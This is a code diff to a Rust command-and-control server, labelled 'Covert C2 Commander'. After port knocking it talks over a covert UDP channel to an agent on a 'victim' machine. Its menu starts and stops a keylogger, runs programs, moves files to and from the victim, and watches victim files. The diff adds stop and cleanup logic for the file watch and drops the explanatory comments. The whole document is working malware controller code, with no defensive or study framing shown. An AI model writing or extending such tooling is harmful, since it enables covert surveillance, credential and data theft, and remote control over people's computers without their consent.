@@ -1,14 +1,4 @@
 /// Covert C2 Commander Server
-///
-/// Features:
-/// - Menu-driven state machine (Disconnected/Connected)
-/// - Port knock initiation via port_knkr module
-/// - Covert UDP channel for C2 commands
-/// - Keylogger control, shell execution, file transfer
-///
-/// Compliance: All protocol data in UDP payload only.
-/// UDP header fields are OS-managed; no transport-layer abuse.
-
 use std::collections::HashMap;
 use std::io::{self, Write};
 use std::net::{Ipv4Addr, IpAddr, SocketAddr, UdpSocket};
@@ -20,7 +10,6 @@ use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3};
 use pnet_datalink as datalink;
 
-// Import modules
 mod port_knkr;
 mod packet;
 
@@ -28,23 +17,20 @@ use port_knkr::{KnockSession, port_knock};
 use packet::{PacketHeader, HEADER_SIZE,
              PACKET_TYPE_ACK, PACKET_TYPE_HEARTBEAT,
              PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP,
-             PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
+             PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
              CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
 
-// Configuration
 const BUFFER_SIZE: usize = 4096;
 const MAX_RETRIES: u32 = 3;
 const CHUNK_SIZE: usize = 1024;
 
-// Session state machine
 #[derive(Clone, Copy, PartialEq)]
 enum SessionState {
     Disconnected,
     Connected,
 }
 
-// C2 Commander struct
 pub struct Commander {
     state: SessionState,
     victim_ip: Option<Ipv4Addr>,
@@ -56,8 +42,9 @@ pub struct Commander {
     running: Arc<AtomicBool>,
     pending_commands: HashMap<[u8; 16], Instant>,
     keylog_buffer: HashMap<Ipv4Addr, Vec<u8>>,
-    file_watch_active: bool,           // ADD THIS
+    file_watch_active: bool,
     file_watch_path: Option<String>,
+    file_watch_local_path: Option<String>,
 }
 
 impl Commander {
@@ -73,8 +60,9 @@ impl Commander {
             running: Arc::new(AtomicBool::new(true)),
             pending_commands: HashMap::new(),
             keylog_buffer: HashMap::new(),
-            file_watch_active: false,      // ADD THIS
+            file_watch_active: false,
             file_watch_path: None,
+            file_watch_local_path: None,
         }
     }
 
@@ -82,15 +70,24 @@ impl Commander {
         println!("=== Covert C2 Commander ===");
         
         let shutdown = self.running.clone();
+        let watch_active = Arc::new(AtomicBool::new(false));
+        let watch_active_clone = watch_active.clone();
+        
         ctrlc::set_handler(move || {
             println!("\nShutdown signal received");
-            shutdown.store(false, Ordering::SeqCst);
+            // If file watch is active, just stop the watch and return to menu
+            if watch_active_clone.load(Ordering::SeqCst) {
+                println!("[*] Stopping file watch...");
+                watch_active_clone.store(false, Ordering::SeqCst);
+            } else {
+                shutdown.store(false, Ordering::SeqCst);
+            }
         }).expect("Error setting Ctrl-C handler");
 
         while self.running.load(Ordering::SeqCst) {
             match self.state {
                 SessionState::Disconnected => self.disconnected_menu(),
-                SessionState::Connected => self.connected_menu(),
+                SessionState::Connected => self.connected_menu(&watch_active),
             }
             
             self.process_incoming();
@@ -115,9 +112,12 @@ impl Commander {
         }
     }
 
-    fn connected_menu(&mut self) {
+    fn connected_menu(&mut self, watch_active: &Arc<AtomicBool>) {
         if let Some(ip) = self.victim_ip {
             println!("\n[CONNECTED] -> {:?}", ip);
+        }
+        if self.file_watch_active {
+            println!("[*] File watch ACTIVE: {}", self.file_watch_path.as_ref().unwrap_or("unknown"));
         }
         println!("1) Start Keylogger");
         println!("2) Stop Keylogger");
@@ -126,20 +126,53 @@ impl Commander {
         println!("5) Transfer File to Victim");
         println!("6) Transfer File from Victim");
         println!("7) Watch a File for changes");
-        println!("8) Uninstall Agent");
-        println!("9) Disconnect");
+        if self.file_watch_active {
+            println!("8) Stop File Watch");
+            println!("9) Uninstall Agent");
+            println!("10) Disconnect");
+        } else {
+            println!("8) Uninstall Agent");
+            println!("9) Disconnect");
+        }
         println!("0) Exit Commander");
         
-        match prompt("Selection > ").as_str() {
+        let selection = prompt("Selection > ");
+        
+        // Check if watch was interrupted by Ctrl+C
+        if !watch_active.load(Ordering::SeqCst) && self.file_watch_active {
+            println!("[*] File watch was stopped");
+            self.file_watch_active = false;
+            self.file_watch_path = None;
+            self.file_watch_local_path = None;
+        }
+        
+        match selection.as_str() {
             "1" => self.start_keylogger(),
             "2" => self.stop_keylogger(),
             "3" => self.request_keylog_file(),
             "4" => self.run_program(),
             "5" => self.upload_file(),
             "6" => self.download_file(),
-            "7" => self.file_watcher(),
-            "8" => self.uninstall(),
-            "9" => self.disconnect(),
+            "7" => self.file_watcher(watch_active),
+            "8" => {
+                if self.file_watch_active {
+                    self.stop_file_watch();
+                } else {
+                    self.uninstall();
+                }
+            }
+            "9" => {
+                if self.file_watch_active {
+                    self.stop_file_watch();
+                } else {
+                    self.disconnect();
+                }
+            }
+            "10" => {
+                if self.file_watch_active {
+                    self.stop_file_watch();
+                }
+            }
             "0" => {
                 self.running.store(false, Ordering::SeqCst);
             },
@@ -397,13 +430,11 @@ impl Commander {
             }
         };
 
-        // Build metadata: path_len + path + file_size
         let mut metadata = Vec::new();
         metadata.push(remote_path.as_bytes().len() as u8);
         metadata.extend_from_slice(remote_path.as_bytes());
         metadata.extend_from_slice(&(file_data.len() as u32).to_le_bytes());
         
-        // Send as PACKET_TYPE_FILE (not CMD)
         if self.send_packet(PACKET_TYPE_FILE, 0, &metadata).is_err() {
             println!("[!] Failed to send metadata");
             return;
@@ -482,7 +513,7 @@ impl Commander {
         }
     }
 
-    fn file_watcher(&mut self) {
+    fn file_watcher(&mut self, watch_active: &Arc<AtomicBool>) {
         let remote_path = prompt("Remote file path to watch: ");
         
         if remote_path.is_empty() {
@@ -499,7 +530,6 @@ impl Commander {
         println!("[*] Starting file watch on {}...", remote_path);
         println!("[*] Local save location: {}", local_path);
         
-        // Send watch request (0x71)
         let mut request = Vec::new();
         request.push(0x71);
         request.push(remote_path.as_bytes().len() as u8);
@@ -512,7 +542,6 @@ impl Commander {
         
         println!("[+] Watch request sent. Receiving initial file content...");
         
-        // Receive initial file
         let mut file_data = Vec::new();
         let start = Instant::now();
         
@@ -521,8 +550,7 @@ impl Commander {
             
             if let Some(ip) = self.victim_ip {
                 if let Some(data) = self.keylog_buffer.get(&ip) {
-                    // Check for end marker (empty FILE_WATCH packet)
-                    if data.is_empty() {
+                    if data.len() == 1 && data[0] == 0xFF {
                         break;
                     }
                     file_data.extend_from_slice(data);
@@ -537,19 +565,36 @@ impl Commander {
             println!("[+] Initial file saved ({} bytes)", file_data.len());
         }
         
-        // Monitor for changes
-        println!("[*] Monitoring for file changes (Ctrl+C to stop)...");
+        // Set watch active flag
+        self.file_watch_active = true;
+        self.file_watch_path = Some(remote_path.clone());
+        self.file_watch_local_path = Some(local_path.clone());
+        watch_active.store(true, Ordering::SeqCst);
+        
+        println!("[*] Monitoring for file changes (Ctrl+C to stop, returns to menu)...");
         let watch_start = Instant::now();
         
-        while watch_start.elapsed() < Duration::from_secs(600) && self.running.load(Ordering::SeqCst) {
+        // Monitor loop - Ctrl+C will set watch_active to false
+        while watch_start.elapsed() < Duration::from_secs(600) 
+              && self.running.load(Ordering::SeqCst) 
+              && watch_active.load(Ordering::SeqCst) {
             self.process_incoming();
             
             if let Some(ip) = self.victim_ip {
                 if let Some(data) = self.keylog_buffer.get(&ip) {
-                    // Check packet type from header (need to track this)
-                    // For now, check if we got FILE_WATCH_UPDATE data
-                    if !data.is_empty() {
-                        // Write PURE file data - no markers to strip!
+                    if data.len() == 1 && data[0] == 0x72 {
+                        let timestamp = Instant::now().duration_since(watch_start).as_secs();
+                        let deleted_path = format!("watched/deleted/{}_{}", local_filename, timestamp);
+                        
+                        if std::path::Path::new(&local_path).exists() {
+                            let _ = std::fs::rename(&local_path, &deleted_path);
+                        }
+                        println!("[!] File deleted on victim");
+                        self.keylog_buffer.remove(&ip);
+                        break;
+                    }
+                    
+                    if !data.is_empty() && data[0] != 0x72 {
                         match std::fs::write(&local_path, data) {
                             Ok(_) => println!("[*] File updated ({} bytes)", data.len()),
                             Err(e) => println!("[!] Failed to save: {}", e),
@@ -561,14 +606,32 @@ impl Commander {
             thread::sleep(Duration::from_millis(500));
         }
         
-        // Send stop command (0x74)
-        let mut stop_request = Vec::new();
-        stop_request.push(0x74);
-        stop_request.push(remote_path.as_bytes().len() as u8);
-        stop_request.extend_from_slice(remote_path.as_bytes());
-        let _ = self.send_packet(PACKET_TYPE_CMD, 0, &stop_request);
+        // Clean up watch state (don't send stop command - let victim continue watching)
+        self.file_watch_active = false;
+        self.file_watch_path = None;
+        self.file_watch_local_path = None;
+        watch_active.store(false, Ordering::SeqCst);
         
-        println!("[+] File watch session ended");
+        println!("[*] File watch stopped - returned to menu");
+    }
+
+    fn stop_file_watch(&mut self) {
+        println!("[*] Stopping file watch...");
+        
+        if let Some(ref remote_path) = self.file_watch_path {
+            let mut stop_request = Vec::new();
+            stop_request.push(0x74);
+            stop_request.push(remote_path.as_bytes().len() as u8);
+            stop_request.extend_from_slice(remote_path.as_bytes());
+            let _ = self.send_packet(PACKET_TYPE_CMD, 0, &stop_request);
+            println!("[+] Stop signal sent to victim");
+        }
+        
+        self.file_watch_active = false;
+        self.file_watch_path = None;
+        self.file_watch_local_path = None;
+        
+        println!("[+] File watch stopped");
     }
 
     fn uninstall(&mut self) {
@@ -585,6 +648,11 @@ impl Commander {
 
     fn disconnect(&mut self) {
         println!("Disconnecting from victim...");
+        
+        // Stop file watch if active
+        if self.file_watch_active {
+            self.stop_file_watch();
+        }
         
         if let Some(ref session) = self.knock_session {
             session.stop();
